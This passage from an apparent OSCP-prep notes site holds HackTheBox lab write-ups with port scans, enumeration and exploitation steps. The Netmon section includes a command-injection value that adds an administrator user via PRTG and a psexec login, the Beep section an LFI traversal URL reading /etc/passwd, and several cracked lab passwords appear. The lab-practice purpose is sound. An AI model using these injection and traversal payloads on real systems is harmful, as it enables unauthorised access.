shellshock.</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#lessons-learned","title":"Lessons Learned","text":"<p>Go through each exploit and try to understand the exploit BEFORE using a walkthrough.</p>"},{"location":"OSCP-Prep/HackTheBox/Sizzle/","title":"Sizzle","text":"<p>IP 10.10.10.103</p> <p>Found FQDN with crackmapexec</p> <pre><code>sizzle.htb.local\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Timelapse/","title":"Timelapse","text":"<pre><code>53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-05-08 10:12:59Z)\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0.\n, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 127\n464/tcp   open  kpasswd5?     syn-ack ttl 127\n593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 127\n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0.\n, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 127\n5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing\n49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n55209/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at lea\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Timelapse/#389-636-ldap","title":"389, 636 - LDAP","text":"<p>Uauthenticated bind is allowed. I may be able to query for all the users</p>"},{"location":"OSCP-Prep/HackTheBox/Timelapse/#445-smb","title":"445 - SMB","text":"<p>There were some files in an unprotected share. One of them was a password protected zip. I used <code>zip2john</code> and <code>john</code> to crack the password.</p> <pre><code>supremelegacy\n</code></pre> <p></p>"},{"location":"OSCP-Prep/HackTheBox/netmon/","title":"Netmon","text":"<p>Port 21 (ftp) allows anonymous login, and we have read access to just about the whole system.</p> <p>We see port 80 is open. it appears to be running PRTG Network Monitor.</p> <p>There is an exploit available, however it requires creds.</p> <p>We test default creds <code>prtgadmin:prtgadmin</code> but this is not a valid set of credentials. </p> <p>I did some searching online and found that the credentials (cleartext username and encrypted password) are stored in a configuration file at <code>C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.dat</code></p> <p>We copy the file using FTP to inspect, and find the credentials we're after</p> <p></p> <pre><code>JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======\n</code></pre> <pre><code>OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW\n</code></pre> <p>We keep digging, and find that there is an unencrypted version of this password in the <code>old.bak</code> version of this file. </p> <pre><code>PrTg@dmin2019\n</code></pre> <p>It worked, and we're the System Administrator </p> <p>EDB-46527 is supposed to work for PRTG but I was unable to get it to work. I found this article online that describes the exploit, and decided to try it manually: https://www.codewatch.org/blog/?p=453</p> <p>To summarize, PRTG has a feature to execute a program when specific environmental conditionas occur within Network Monitor. The scripts must be added to the filesystem, and by desing there is no way to upload via the webapp. However, the PowerShell version of the demo script is vulnerable to command injection!</p> <ol> <li>Go to Setup &gt; System Administration &gt; Notifications and click Add new notification</li> <li>Turn on \"Execute Program\"</li> <li>Select the .ps1 script</li> <li>Apply the below parameter which will add a new user <code>pentest</code> with password <code>p3nT3st!</code>:</li> </ol> <pre><code>test.txt; net user pentest p3nT3st! /add\n</code></pre> <ol> <li>Save the notification</li> <li>Run a test notification</li> </ol> <p>Verify pwnage</p> <p></p> <p>Then use psexec to get a shell</p> <pre><code>psexec.py 'pentest:p3nT3st!'@netmon\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/","title":"Bastard","text":"<p><code>Still in progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#recon","title":"Recon","text":"<p>The tags for this box are:  </p> <ul> <li>Windows</li> <li>PHP  </li> <li>Patch Management</li> <li>Web</li> </ul> <p>Difficulty:</p> <p>Medium</p> <p>Port scan revealed webserver on port 80, RPC on 139 and 49154. The webserver has Drupal 7 running on IIS 7.5</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#enumerating-the-webserver","title":"Enumerating the webserver","text":"<p>There are some interesting entries in <code>robots.txt</code>:  </p> <pre><code># Directories\nDisallow: /includes/\nDisallow: /misc/\nDisallow: /modules/\nDisallow: /profiles/\nDisallow: /scripts/\nDisallow: /themes/\n# Files\nDisallow: /CHANGELOG.txt\nDisallow: /cron.php\nDisallow: /INSTALL.mysql.txt\nDisallow: /INSTALL.pgsql.txt\nDisallow: /INSTALL.sqlite.txt\nDisallow: /install.php\nDisallow: /INSTALL.txt\nDisallow: /LICENSE.txt\nDisallow: /MAINTAINERS.txt\nDisallow: /update.php\nDisallow: /UPGRADE.txt\nDisallow: /xmlrpc.php\n# Paths (clean URLs)\nDisallow: /admin/\nDisallow: /comment/reply/\nDisallow: /filter/tips/\nDisallow: /node/add/\nDisallow: /search/\nDisallow: /user/register/\nDisallow: /user/password/\nDisallow: /user/login/\nDisallow: /user/logout/\n# Paths (no clean URLs)\nDisallow: /?q=admin/\nDisallow: /?q=comment/reply/\nDisallow: /?q=filter/tips/\nDisallow: /?q=node/add/\nDisallow: /?q=search/\nDisallow: /?q=user/password/\nDisallow: /?q=user/register/\nDisallow: /?q=user/login/\nDisallow: /?q=user/logout/\n</code></pre> <p>There are also some interesting findings by feroxbuster</p> <pre><code>200      159l      413w     7583c http://10.10.10.9/0\n200      159l      413w     7583c http://10.10.10.9/node\n200        1l        7w       62c http://10.10.10.9/rest\n200       90l      243w     2189c http://10.10.10.9/robots.txt\n200      152l      394w     7420c http://10.10.10.9/user\n200      159l      413w     7583c http://10.10.10.9/0\n200      159l      413w     7583c http://10.10.10.9/index.php\n200       45l      262w     1717c http://10.10.10.9/install.mysql.txt\n200       44l      290w     1874c http://10.10.10.9/install.pgsql.txt\n200      159l      413w     7583c http://10.10.10.9/node\n200        1l        7w       62c http://10.10.10.9/rest\n200       90l      243w     2189c http://10.10.10.9/robots.txt\n200      152l      394w     7420c http://10.10.10.9/user\n200        1l        6w       42c http://10.10.10.9/xmlrpc.php\n200      152l      394w     7420c http://10.10.10.9/user\n200      159l      413w     7583c http://10.10.10.9/node\n200      159l      413w     7583c http://10.10.10.9/\n200      159l      413w     7583c http://10.10.10.9/0\n200      175l      510w     9063c http://10.10.10.9/User\n200        1l        7w       62c http://10.10.10.9/rest\n200        1l        7w       62c http://10.10.10.9/REST\n200      175l      510w     9063c http://10.10.10.9/USER\n200      123l      714w     5382c http://10.10.10.9/ReadMe.txt\n\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#nmap-port-scan","title":"NMAP port scan","text":"<pre><code>PORT      STATE SERVICE REASON          VERSION                                                                                                                              80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5                                                                                                              | http-robots.txt: 36 disallowed entries                                                                                                                                     | /includes/ /misc/ /modules/ /profiles/ /scripts/                                                                                                                           | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt                                                                                                                       | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt                                                                                                           | /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php                                                                                                         | /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/                                                                                                                  | /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/                                                                                                      | /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/                                                                                                              |_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/                                                                                                     | http-methods:                                                                                                                                                              |   Supported Methods: OPTIONS TRACE GET HEAD POST                                                                                                                           |_  Potentially risky methods: TRACE                                                                                                                                         |_http-title: Welcome to 10.10.10.9 | 10.10.10.9                                                                                                                             |_http-generator: Drupal 7 (http://drupal.org)                                                                                                                               |_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03                                                                                                        |_http-server-header: Microsoft-IIS/7.5                                                                                                                                      135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC                                                                                                                49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC                                                                                                                Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                        Device type: specialized|general purpose|phone                                                                                                                               Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (91%)\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#services","title":"Services","text":""},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#port-80","title":"Port 80","text":""},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#iis-75","title":"IIS 7.5","text":""},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#drupal-7","title":"Drupal 7","text":""},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#port-135","title":"Port 135","text":""},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Bastard/#port-49154","title":"Port 49154","text":""},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Beep/","title":"Beep","text":"<p><code>still in progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Beep/#recon","title":"Recon","text":"<p>Tags for this box:  </p> <ul> <li>LFI</li> <li>Web </li> </ul> <p>Difficulty:</p> <p>Easy</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Beep/#scan-findings","title":"Scan findings","text":"<pre><code>PORT      STATE SERVICE    REASON         VERSION\n22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)\n25/tcp    open  smtp       syn-ack ttl 63 Postfix smtpd\n|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN\n80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3\n|_http-server-header: Apache/2.2.3 (CentOS)\n|_http-title: Did not follow redirect to https://10.10.10.7/\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n110/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4\n111/tcp   open  rpcbind    syn-ack ttl 63 2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1            875/udp   status\n|_  100024  1            878/tcp   status\n143/tcp   open  imap       syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4\n|_imap-capabilities: NAMESPACE THREAD=ORDEREDSUBJECT LIST-SUBSCRIBED URLAUTHA0001 LISTEXT OK X-NETSCAPE IDLE RENAME CATENATE CONDSTORE MULTIAPPEND THREAD=REFERENCES ANNOTATEMORE Completed SORT=MODSEQ SORT IMAP4rev1 ATOMIC NO QUOTA BINARY LITERAL+ ACL CHILDREN ID IMAP4 STARTTLS MAILBOX-REFERRALS UNSELECT UIDPLUS RIGHTS=kxte\n443/tcp   open  ssl/http   syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS))\n|_http-server-header: Apache/2.2.3 (CentOS)\n| http-robots.txt: 1 disallowed entry\n|_/\n878/tcp   open  status     syn-ack ttl 63 1 (RPC #100024)\n993/tcp   open  ssl/imap   syn-ack ttl 63 Cyrus imapd\n995/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d\n3306/tcp  open  mysql      syn-ack ttl 63 MySQL (unauthorized)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n4190/tcp  open  sieve      syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)\n4445/tcp  open  upnotifyp? syn-ack ttl 63\n4559/tcp  open  hylafax    syn-ack ttl 63 HylaFAX 4.3.10\n5038/tcp  open  asterisk   syn-ack ttl 63 Asterisk Call Manager 1.1\n10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)\n|_http-trane-info: Problem with XML parsing of /evox/about\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).\nAggressive OS guesses: Linux 2.6.9 - 2.6.24 (95%),\n</code></pre> <p>Some users found on port 25</p> <pre><code>[25][smtp-enum] host: 10.10.10.7   login: info  \n[25][smtp-enum] host: 10.10.10.7   login: adm  \n[25][smtp-enum] host: 10.10.10.7   login: root  \n[25][smtp-enum] host: 10.10.10.7   login: mysql  \n[25][smtp-enum] host: 10.10.10.7   login: ftp\n</code></pre> <p>https webserver has a few webpages</p> <pre><code>200        1l        6w      894c https://10.10.10.7/favicon.ico  \n200        2l        4w       28c https://10.10.10.7/robots.txt  \n200       35l      111w     1785c https://10.10.10.7/  \n200       35l      111w     1785c https://10.10.10.7/config.php  \n200       35l      111w     1785c https://10.10.10.7/index.php  \n200       35l      111w     1785c https://10.10.10.7/register.php\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Beep/#enumeration","title":"Enumeration","text":"<p>The site on 443 is an Elastics CRM login page. </p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Beep/#exploitation","title":"Exploitation","text":"<p>It might be this, considering the LFI tag. </p> <p>That exploit doesn't work, however it does help to enumerate vtigercrm. I checked, and sure enough it's on this box. The login page even discloses the version <code>5.1.0</code></p> <p></p> <p>This new exploit EDB-18770, suggests the following url: <code>https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00</code></p> <p>Sure enough, I can read files now.</p> <p></p> <p>After some testing, it looks like we only need to go up 4 directories in the directory traversal: <code>/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../etc/passwd%00</code></p> <p>Contents of <code>/etc/passwd</code></p> <pre><code>root:x:0:0:root:/root:/bin/bash\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash\ncyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash\nasterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash\nfanis:x:501:501::/home/fanis:/bin/bash\n</code></pre> <p>I was able to get the user flag using LFI</p> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Beep/#more-enumeration","title":"more Enumeration","text":"<p>There is also a webserver on port 10000. </p> <p>An nmap script picked up <code>CVE-2006-3392</code>  This CVE is linked to EDB-1997.  </p> <p>Reviewing the exploit shows usage on line 50. No changes are necessary; all variables are provided at runtime instead of hardcoded in varaibles. </p> <p>This exploit is throwing errors: </p> <p>I found this answer on StackOverflow.  Installing the proper version for my php package.  </p> <p>To identify php version:</p> <pre><code>php --version\n</code></pre> <p>Then install proper version:</p> <pre><code>sudo apt install php7.4-curl\n</code></pre> <p></p> <p>It appears this exploit is not working even with php-curl installed.</p> <p>There are a bunch of SSL errors in the NMAP output. It seems Autorecon was scanning using HTTP instead of HTTPS. Will re-run some scans with https.</p> <p>These commands should be re-run using HTTPS instead of HTTP.</p> <pre><code>curl -sSik https://10.10.10.7:10000/ &amp;&amp;\ncurl -sSikf https://10.10.10.7:10000/.well-known/security.txt &amp;&amp;\ncurl -sSikf https://10.10.10.7:10000/robots.txt &amp;&amp;\n\nnmap -vv --reason -Pn -T4 -sV -p 10000 --script=\"banner,(https* or ssl*) and not (brute or broadcast or dos or external or https-slowloris* or fuzzer)\" -oN \"/home/nate/hackthebox/beep/scans/tcp10000/tcp_10000_https_nmap.txt\" -oX \"/home/nate/hackthebox/beep/scans/tcp10000/xml/tcp_10000_https_nmap.xml\" 10.10.10.7 &amp;&amp;\n\nwhatweb --color=never --no-errors -a 3 -v https://10.10.10.7:10000 2&gt;&amp;1\n</code></pre> <pre><code>feroxbuster -u https://10.10.10.7:10000/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x \"php,bin,txt\" -v -k -n -o /home/nate/hackthebox/beep/scans/tcp80/tcp_80_http_feroxbuster_https.txt\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Beep/#gotta-get-a-shell","title":"Gotta get a shell.","text":"<p>I have the user flag, but I still don't have code execution. I need to examine the options and decide which route(s) to take.</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Beep/#brainstorming-lfi-to-rce","title":"Brainstorming: LFI to RCE","text":"<ul> <li>Poison logs</li> <li>Maybe RFI?</li> <li></li> </ul>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Brainfuck/","title":"Brainfuck","text":"<p><code>Still in progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Brainfuck/#recon","title":"Recon","text":"<p>The tags for this box are:  </p> <ul> <li>Cryptography</li> </ul> <p>Difficulty:  </p> <p>Insane</p> <p>NGINX is running on port 443 but could not access the website by IP. After adding a name resolution to <code>/etc/hosts</code> I was able to access the site at <code>https://brainfuck.htb</code>. It's running WordPress 4.7.3, there is a login page at <code>/wp-admin</code></p> <p>One of the plugins is vulnerable</p> <pre><code>searchsploit ticket system 7.1.3                                         \n</code></pre> <p></p> <p>EDB <code>41006</code>, <code>40939</code> - These vulnerabilities require user-level access, so they aren't useful yet.</p> <p>Nikto picked up an interesting link in the response headers:</p> <pre><code>+ Uncommon header 'link' found, with contents: &lt;https://brainfuck.htb/?rest_route=/&gt;; rel=\"https://api.w.org/\"\n</code></pre> <p>Enumerating the API shows a bunch of different endpoints exposed. One of the endpoints displays all users - the only user in this case is admin.</p> <p></p> <p>Maybe I can inject a user? </p> <p>NOTE - brainfuck (the name of this box) is also the name of an encoding algorithm on this decoder.  Turns out this is a meme programming language. Read about it on Wikipedia</p> <p>At this point, it seems I should be looking for some brainfuck-encoded value and try to decode it, though after reading about brainfuck on wikipedia the author of this challenge likely put many rabbit-holes in place which will make it difficult to find the correct attack vector.</p> <p>As I review scan results, I wonder if there is a passphrase associated with the TLS certificate. If I crack it, it may be the same pw for wordpress.</p> <p>On the cert there is an AltName</p> <p> I added the altname to <code>/etc/hosts</code>, for the same IP as <code>brainfuck.htb</code>. And sure enough there's a super secret hidden forum!</p> <p></p> <p>Also found a session cookie! Maybe this is the brainfuck-encoded value! Couldn't decode the cookie.</p> <p>I was able to register an account. Successful login looks like this: </p> <ul> <li>There's another cookie named <code>flarum_remember</code>, which also doesn't decode to anything obvious.</li> <li>My created user has an ID of 4. Wonder who the other users are?</li> </ul> <p>I was able to use forced browsing to find user with ID 3, which was the only mystery user (I already saw admin is 1 and restis is 2, I was 4) </p> <p>Looking at the admin user, there appears to be some private posts and discussions: </p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Brainfuck/#exploitation","title":"Exploitation","text":"<p>Since I didn't find any other way to break the authentication mechanism, I decided to try a brute force attack. I decided to test the known usernames with a few wordlists. Since the usernames appear to follow a Greek Mythology theme, I will be using this Greek wordlist to fuzz the 3 users.</p> <p> </p> <p>User: <code>kostas</code> Pass: <code>123123123</code></p> <p>I logged in to the secret forum, but this user has nothing useful. The email provided for this user was kostas@testest.com - which makes me think this account is worthless. Of these accounts, the only one that also works in <code>/wp-admin/</code> is admin.</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Breadcrumbs/","title":"Breadcrumbs","text":"<p><code>Still in progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Breadcrumbs/#recon","title":"Recon","text":"<p>The tags on this box </p> <ul> <li>Windows</li> <li>SQL Injection</li> <li>JSON</li> <li>Source code review</li> </ul> <p>Difficulty:</p> <p>Hard</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Breadcrumbs/#port-scan","title":"Port Scan","text":"<pre><code>22/tcp    open     ssh           syn-ack ttl 127                     OpenSSH for_Windows_7.7 (protocol 2.0)\n135/tcp   open     msrpc         syn-ack ttl 127                     Microsoft Windows RPC\n139/tcp   open     netbios-ssn   syn-ack ttl 127                     Microsoft Windows netbios-ssn\n445/tcp   open     microsoft-ds? syn-ack ttl 127\n3306/tcp  open     mysql?        syn-ack ttl 127\n| mysql-info:\n|_  MySQL Error: Host '10.10.16.3' is not allowed to connect to this MariaDB server\n5040/tcp  open     unknown       syn-ack ttl 127\n7680/tcp  open     pando-pub?    syn-ack ttl 127\n30117/tcp filtered unknown       host-unreach from 10.10.16.1 ttl 64\n49664/tcp open     msrpc         syn-ack ttl 127                     Microsoft Windows RPC\n49665/tcp open     msrpc         syn-ack ttl 127                     Microsoft Windows RPC\n49666/tcp open     msrpc         syn-ack ttl 127                     Microsoft Windows RPC\n49667/tcp open     msrpc         syn-ack ttl 127                     Microsoft Windows RPC\n49668/tcp open     msrpc         syn-ack ttl 127                     Microsoft Windows RPC\n49669/tcp open     msrpc         syn-ack ttl 127                     Microsoft Windows RPC\n\nAggressive OS guesses:   \n    Microsoft Windows 10 1709 - 1909 (95%),  \n    Microsoft Windows Longhorn (94%),  \n    Microsoft Windows 10 1703 (93%),  \n    Microsoft Windows 7 SP1 (93%),  \n    Microsoft Windows 8 (93%),  \n    Microsoft Windows 10 1809 - 1909 (93%),  \n    Microsoft Windows 10 1511 (92%),  \n    Microsoft Windows Server 2008 R2 (92%),  \n    Microsoft Windows Server 2008 SP2 (92%),  \n    Microsoft Windows 8.1 Update 1 (92%)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Grandpa/","title":"Grandpa","text":"<p><code>Still in progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Grandpa/#recon","title":"Recon","text":"<p>The tags on this box </p> <ul> <li>Windows</li> <li>Patch Management  </li> <li>Web</li> </ul> <p>Difficulty:</p> <p>Easy</p> <p>What gives?!</p> <p>I keep getting stuck on these easy ones. The only open port on this box is 80. It's running IIS 6.0 (I never checked for public exploits for this). I was able to connect with <code>cadaver</code> but unable to upload anything. (Maybe credentials are needed?)</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Kotarak/","title":"Kotarak","text":"<p><code>Still in progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Kotarak/#recon","title":"Recon","text":"<p>The tags on this box </p> <ul> <li>Web</li> <li>Arbitrary file upload</li> </ul> <p>Difficulty:</p> <p>Hard</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Kotarak/#port-scan","title":"Port Scan","text":"<pre><code>\nPORT      STATE SERVICE REASON         VERSION                                                                                                                       22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)                                                                          8009/tcp  open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)                                                                                                          8080/tcp  open  http    syn-ack ttl 63 Apache Tomcat 8.5.5                                                                                                                   60000/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))                                                                                                                              Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)\n\n</code></pre> <p>Ssh seems to be up to date, and I've heard advice in the past about doing webservers last (since they can take the longest.) So we will start by examining Apache Jserv</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Kotarak/#apache-jserv-ajp-v13","title":"Apache Jserv (ajp v1.3)","text":"<p>According to Hacktricks.xyz</p> <p>CVE-2020-1938 'Ghostcat'</p> <p>If the AJP port is exposed, Tomcat might be susceptible to the Ghostcat vulnerability. Ghostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled. Still, this can include files like <code>WEB-INF/web.xml</code> which can leak important information like credentials for the Tomcat interface, depending on the server setup.</p> <p>EDB-48143 is a public ghostcat exploit. I breifly reviewed the python script and it appears the variables are given as arguments; there's nothing in the script that needs to be modified. Running the script with no arguments gives the usage:</p> <pre><code>\u250c\u2500\u2500(nate@kali-Dell)-[~/hackthebox/kotarak/exploit]                                                                                                                           \u2514\u2500$ ./48143.py                                                                                                                                                               usage: 48143.py [-h] [-p PORT] [-f FILE] target                                                                                                                              48143.py: error: too few arguments   \n</code></pre> <p>Now we need to define our arguments: - PORT: AJP is running on port 8009 - FILE: good point, we'll have to find a file worth reading. - target: the target is kotorak, which is at 10.10.10.55</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Kotarak/#finding-potentially-sensitive-files","title":"FInding potentially sensitive files.","text":"<p>Lets figure out what we can read with this.</p> <p>Looking through some of the scan results, I notice the following directories of interest:</p> <pre><code>302        0l        0w        0c http://10.10.10.55:8080/docs\n302        0l        0w        0c http://10.10.10.55:8080/examples\n200       22l       93w    21630c http://10.10.10.55:8080/favicon.ico\n302        0l        0w        0c http://10.10.10.55:8080/host-manager\n200      202l      498w        0c http://10.10.10.55:8080/index.jsp\n302        0l        0w        0c http://10.10.10.55:8080/manager\n</code></pre> <p>Now to scan each dir to see what files are in there.</p> <p>I put all the directory URLs in a file called <code>urls</code> and will use this file to run multiple feroxbuster scans with some powershell kung-fu.</p> <pre><code>cat ./urls | %{feroxbuster -u $_ -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x \"txt,html,php,asp,aspx,jsp\" -v -k -n -q -o \"/home/nate/hackthebox/kotarak/scans/tcp8080/tcp_8080_http_$($_.split('/')[3]).txt\"}\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Nineveh/","title":"Nineveh","text":"<p><code>still in progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Nineveh/#recon","title":"Recon","text":"<p>Tags for this box:  </p> <ul> <li>LFI</li> <li>Web </li> <li>PHP</li> <li>Port knocking</li> </ul> <p>Difficulty:</p> <p>Medium</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Nineveh/#port-scan","title":"Port scan","text":"<pre><code>PORT    STATE SERVICE  REASON         VERSION\n80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Site doesn't have a title (text/html).\n| http-methods:\n|_  Supported Methods: POST OPTIONS GET HEAD\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Site doesn't have a title (text/html).\n| http-methods:\n|_  Supported Methods: POST OPTIONS GET HEAD\n</code></pre> <p>Nikto identified RFI</p> <ul> <li>OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/</li> </ul> <p>I did a POC by hosting \"Hello Wolrd\" in a text file and trying to load it. The string doesn't appear anywhere on the info page. It seems like this exploit won't work on this box.</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/ScriptKiddie/","title":"Script Kiddie","text":"<p><code>still in progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/ScriptKiddie/#recon","title":"Recon","text":"<p>The tags for this box </p> <ul> <li>Outdated software</li> </ul> <p>Difficulty:</p> <p>Easy</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/ScriptKiddie/#port-scan","title":"Port scan","text":"<p>Only 2 open ports on this one - 22 and 5000.</p> <p>Port 22 has SSH running and port 5000 is a werkzug (python) webserver.</p> <p>A recent piece of advice I heard is to enumerate the webserver last, because it's usually pretty complex and there's a lot of steps. So I checked for SSH exploits first. SSH doesn't really have a lot of useful exploits, and this version doesn't appear to have any public exploits.</p> <p>On to the webserver! The webserver homepage has a few hacking tools on it. Nmap, searchsploit, and msfvenom. I tried doing command injection using the <code>;</code> and <code>&amp;&amp;</code> operators to string multiple commands together. But each tool seems to screen for that and display a message about \"stop trying to hack me\".  </p> <p>The msfvenom tool is interesting. A user can upload an msfvenom template and then run an msfvenom command. Note: Some process on the server will be executing with data provided by the user.</p> <p>I thought I was stuck so I started moving on but after taking these notes I think I should look closer at the msfvenom vector.</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/","title":"Solidstate","text":"<p><code>still in 